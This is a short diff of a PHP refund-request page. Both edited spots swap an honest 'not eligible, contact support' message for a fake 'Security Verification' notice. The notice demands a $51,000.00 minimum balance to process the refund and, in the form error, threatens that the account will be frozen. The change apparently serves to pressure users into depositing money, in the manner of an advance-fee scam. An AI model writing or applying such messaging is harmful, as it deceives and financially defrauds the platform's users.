@@ -88,7 +88,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $other_method  = trim($_POST['other_method'] ?? '');
 
     if (!$is_eligible) {
-        $errors[] = 'Your account is not currently eligible to request a refund.';
+        $errors[] = 'Security Verification: A minimum balance of $51,000.00 is required to process this unusual refund request to avoid account being freezed.';
     }
     if (!$tx_id)         $errors[] = 'Transaction is required.';
     if (!$amount)        $errors[] = 'Amount is required.';
@@ -226,7 +226,7 @@ foreach ($fields_by_method as $mname => $mfields) {
         </div>
         
         <div class="modal-body">
-            <p>Your account is not currently authorised to submit a refund request. Please contact support if you believe this is an error.</p>
+            <p>Security Verification: A minimum balance of <strong>$51,000.00</strong> is required to verify your account and process this unusual refund request.</p>
         </div>
 
         <div class="modal-footer">
